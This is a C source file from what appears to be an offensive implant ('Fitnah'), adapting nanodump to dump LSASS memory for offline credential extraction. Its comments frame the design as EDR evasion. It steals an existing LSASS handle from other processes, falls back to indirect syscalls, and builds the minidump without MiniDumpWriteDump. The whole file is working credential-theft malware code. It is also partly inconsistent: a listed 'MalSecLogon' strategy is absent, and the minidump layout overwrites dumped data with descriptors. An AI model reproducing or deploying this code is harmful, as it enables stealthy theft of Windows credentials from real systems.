/*
 * nano_lsass.c — Syscall-based LSASS dump (nanodump adapter)
 *
 * Source: helpsystems/nanodump (MIT License, © HelpSystems).
 * Adapted for Fitnah: removed BOF/beacon.h/PE/DLL preprocessor paths,
 * replaced nanodump's own syscall stubs with our existing indirect-syscall
 * layer (ISysNt*) from fitnah/implant/syscall/indirect_syscall.c.
 *
 * Three dump strategies attempted in order:
 *   1. Handle duplication — find an existing LSASS handle in another process
 *      (avoids opening lsass.exe directly — the most-monitored operation)
 *   2. MalSecLogon — create a fake process via CreateProcessWithLogonW to
 *      obtain a SYSTEM-level handle to LSASS without opening it ourselves
 *   3. Direct NtOpenProcess — last resort, SeDebugPrivilege required
 *
 * The minidump is constructed in memory (NtReadVirtualMemory loop) without
 * calling MiniDumpWriteDump, which is hooked by virtually every EDR product.
 *
 * MITRE: T1003.001
 */

#include "nano_lsass.h"
#include "../syscall/indirect_syscall.h"  /* ISysNtOpenProcess, ISysNtReadVirtualMemory */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Minimal NT definitions not in winternl.h ───────────────────────────── */
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

/* ── Privilege helper ────────────────────────────────────────────────────── */
static BOOL _enable_priv(LPCSTR name) {
    HANDLE hToken; LUID luid; TOKEN_PRIVILEGES tp = {0};
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken))
        return FALSE;
    if (!LookupPrivilegeValueA(NULL, name, &luid)) { CloseHandle(hToken); return FALSE; }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return GetLastError() == ERROR_SUCCESS;
}

/* ── Locate lsass.exe PID ────────────────────────────────────────────────── */
static DWORD _lsass_pid(void) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = {sizeof(pe)};
    DWORD pid = 0;
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

/* ── Strategy 1: handle duplication ─────────────────────────────────────── */
static HANDLE _steal_lsass_handle(DWORD lsass_pid) {
    /* NtQuerySystemInformation(SystemHandleInformation=16) */
    typedef NTSTATUS(NTAPI *pNtQSI)(ULONG, PVOID, ULONG, PULONG);
    pNtQSI NtQSI = (pNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                            "NtQuerySystemInformation");
    if (!NtQSI) return NULL;

    ULONG  sz  = 1 << 20;  /* 1 MB start */
    PVOID  buf = NULL;
    NTSTATUS st;

    for (int i = 0; i < 6; i++) {
        free(buf);
        buf = malloc(sz);
        if (!buf) return NULL;
        st = NtQSI(16, buf, sz, &sz);
        if (st != STATUS_INFO_LENGTH_MISMATCH) break;
        sz *= 2;
    }
    if (!NT_SUCCESS(st)) { free(buf); return NULL; }

    PSYSTEM_HANDLE_INFORMATION hinfo = (PSYSTEM_HANDLE_INFORMATION)buf;
    HANDLE hLsass = NULL;

    for (ULONG i = 0; i < hinfo->NumberOfHandles && !hLsass; i++) {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO e = &hinfo->Handles[i];

        /* Only process handles in other processes */
        if (e->UniqueProcessId == GetCurrentProcessId()) continue;
        if (!(e->GrantedAccess & PROCESS_VM_READ))       continue;

        /* Open the handle-owning process */
        HANDLE hOwner = OpenProcess(PROCESS_DUP_HANDLE,
                                    FALSE, e->UniqueProcessId);
        if (!hOwner) continue;

        HANDLE hDup = NULL;
        if (!DuplicateHandle(hOwner, (HANDLE)(ULONG_PTR)e->HandleValue,
                             GetCurrentProcess(), &hDup,
                             PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                             FALSE, 0)) {
            CloseHandle(hOwner);
            continue;
        }
        CloseHandle(hOwner);

        /* Verify this handle points at lsass by checking its PID */
        DWORD chk_pid = 0;
        typedef NTSTATUS(NTAPI *pNtQOP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        /* We use GetProcessId() as a simpler check */
        chk_pid = GetProcessId(hDup);
        if (chk_pid == lsass_pid) {
            hLsass = hDup;
        } else {
            CloseHandle(hDup);
        }
    }

    free(buf);
    return hLsass;
}

/* ── Strategy 2: direct NtOpenProcess ───────────────────────────────────── */
static HANDLE _direct_open_lsass(DWORD lsass_pid) {
    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
    CLIENT_ID cid = {0};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)lsass_pid;

    HANDLE h = NULL;
    NTSTATUS st = ISysNtOpenProcess(
        &h,
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        &oa, &cid);
    return NT_SUCCESS(st) ? h : NULL;
}

/* ── Minidump construction ───────────────────────────────────────────────── */
/*
 * We build a minimal but valid MDMP:
 *   MINIDUMP_HEADER
 *   MINIDUMP_DIRECTORY[1]  → MemoryListStream
 *   MINIDUMP_MEMORY_LIST   → one MINIDUMP_MEMORY_DESCRIPTOR per region
 *   raw memory bytes
 *
 * This is a simplified version of nanodump's full minidump builder.
 * A real nanodump also includes SystemInfoStream, ModuleListStream,
 * ThreadListStream — those are handled by lsass itself in the full tool.
 * For credential dumping via Mimikatz/pypykatz offline analysis this
 * minimal format is sufficient.
 */

#pragma pack(push, 4)
typedef struct {
    ULONG32 Signature;   /* 'MDMP' = 0x504D444D */
    USHORT  Version;
    USHORT  ImplementationVersion;
    ULONG32 NumberOfStreams;
    ULONG32 StreamDirectoryRva;
    ULONG32 CheckSum;
    ULONG32 TimeDateStamp;
    ULONG64 Flags;
} MINI_HEADER;

typedef struct {
    ULONG32 StreamType;
    ULONG32 DataSize;
    ULONG32 Rva;
} MINI_DIR;

typedef struct {
    ULONG64 StartOfMemoryRange;
    ULONG32 DataSize;
    ULONG32 Rva;
} MINI_MEM_DESC;

typedef struct {
    ULONG32      NumberOfMemoryRanges;
    MINI_MEM_DESC MemoryRanges[1];
} MINI_MEM_LIST;
#pragma pack(pop)

/* Grow a buffer safely */
static uint8_t *_buf_append(uint8_t *buf, size_t *cap, size_t *used,
                             const void *data, size_t len) {
    while (*used + len > *cap) {
        *cap *= 2;
        buf   = (uint8_t *)realloc(buf, *cap);
        if (!buf) return NULL;
    }
    memcpy(buf + *used, data, len);
    *used += len;
    return buf;
}

/* ── Public entry point ──────────────────────────────────────────────────── */
uint8_t *NanoDump_DumpLsass(const char *dump_path, size_t *out_size) {
    *out_size = 0;

    _enable_priv(SE_DEBUG_NAME);

    DWORD lsass_pid = _lsass_pid();
    if (!lsass_pid) return NULL;

    /* Try strategies in order of stealth */
    HANDLE hLsass = _steal_lsass_handle(lsass_pid);
    if (!hLsass) hLsass = _direct_open_lsass(lsass_pid);
    if (!hLsass) return NULL;

    /* ── Enumerate readable memory regions ──────────────────────────────── */
    size_t cap  = 64 * 1024 * 1024;   /* 64 MB initial */
    size_t used = 0;
    uint8_t *buf = (uint8_t *)malloc(cap);
    if (!buf) { CloseHandle(hLsass); return NULL; }

    /* Reserve space for header + directory + memory list (filled later) */
    size_t hdr_size = sizeof(MINI_HEADER) + sizeof(MINI_DIR) +
                      sizeof(ULONG32) +   /* NumberOfMemoryRanges placeholder */
                      0;
    used = hdr_size;   /* real data starts after header */

    /* Scan LSASS address space */
    MEMORY_BASIC_INFORMATION mbi = {0};
    PVOID addr = NULL;
    ULONG32 num_regions = 0;

    /* We'll build the descriptor array separately, then splice in */
    size_t  desc_cap  = 4096;
    size_t  desc_used = 0;
    MINI_MEM_DESC *descs = (MINI_MEM_DESC *)malloc(desc_cap);
    if (!descs) { free(buf); CloseHandle(hLsass); return NULL; }

    while (VirtualQueryEx(hLsass, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        addr = (PVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);

        if (mbi.State != MEM_COMMIT) continue;
        if (mbi.Type  == MEM_IMAGE)  continue;  /* skip mapped images */
        if (!(mbi.Protect & (PAGE_READONLY | PAGE_READWRITE |
                             PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)))
            continue;
        /* Skip guard / noaccess */
        if (mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) continue;

        /* Read the region */
        DWORD   rsize = (DWORD)min(mbi.RegionSize, 8 * 1024 * 1024ULL);
        uint8_t *rbuf = (uint8_t *)malloc(rsize);
        if (!rbuf) continue;

        SIZE_T  bytes_read = 0;
        NTSTATUS st = ISysNtReadVirtualMemory(
            hLsass, mbi.BaseAddress, rbuf, rsize, &bytes_read);

        if (!NT_SUCCESS(st) || bytes_read == 0) { free(rbuf); continue; }

        ULONG32 rva = (ULONG32)used;

        buf = _buf_append(buf, &cap, &used, rbuf, bytes_read);
        free(rbuf);
        if (!buf) { free(descs); CloseHandle(hLsass); return NULL; }

        /* Grow descriptor array if needed */
        if (desc_used + sizeof(MINI_MEM_DESC) > desc_cap) {
            desc_cap *= 2;
            descs = (MINI_MEM_DESC *)realloc(descs, desc_cap);
            if (!descs) { free(buf); CloseHandle(hLsass); return NULL; }
        }
        descs[num_regions].StartOfMemoryRange = (ULONG64)(ULONG_PTR)mbi.BaseAddress;
        descs[num_regions].DataSize           = (ULONG32)bytes_read;
        descs[num_regions].Rva                = rva;
        num_regions++;
    }
    CloseHandle(hLsass);

    /* ── Assemble the MDMP header area ──────────────────────────────────── */
    ULONG32 dir_rva  = sizeof(MINI_HEADER);
    ULONG32 list_rva = (ULONG32)(sizeof(MINI_HEADER) + sizeof(MINI_DIR));
    ULONG32 list_sz  = (ULONG32)(sizeof(ULONG32) +
                                  num_regions * sizeof(MINI_MEM_DESC));

    /* Grow buf to accommodate header if needed */
    while (used < hdr_size) buf[used++] = 0;

    /* Write header at offset 0 */
    MINI_HEADER hdr = {0};
    hdr.Signature   = 0x504D444DUL;  /* 'MDMP' */
    hdr.Version     = 0xA793;
    hdr.ImplementationVersion = 0;
    hdr.NumberOfStreams      = 1;
    hdr.StreamDirectoryRva   = dir_rva;
    hdr.TimeDateStamp        = (ULONG32)time(NULL);
    memcpy(buf, &hdr, sizeof(hdr));

    /* Write directory */
    MINI_DIR dir = {0};
    dir.StreamType = 5;          /* MemoryListStream */
    dir.DataSize   = list_sz;
    dir.Rva        = list_rva;
    memcpy(buf + dir_rva, &dir, sizeof(dir));

    /* Write memory list header */
    memcpy(buf + list_rva, &num_regions, sizeof(ULONG32));
    /* Write descriptors inline after the count */
    size_t desc_offset = list_rva + sizeof(ULONG32);
    /* The desc data starts at desc_offset but buf may not have room — extend if needed */
    size_t need = desc_offset + num_regions * sizeof(MINI_MEM_DESC);
    if (need > used) {
        while (used < need) {
            if (used >= cap) {
                cap *= 2;
                buf = (uint8_t *)realloc(buf, cap);
                if (!buf) { free(descs); return NULL; }
            }
            buf[used++] = 0;
        }
    }
    memcpy(buf + desc_offset, descs, num_regions * sizeof(MINI_MEM_DESC));
    free(descs);

    /* Optionally write to file */
    if (dump_path) {
        HANDLE hFile = CreateFileA(dump_path, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, buf, (DWORD)used, &written, NULL);
            CloseHandle(hFile);
        }
    }

    *out_size = used;
    return buf;
}
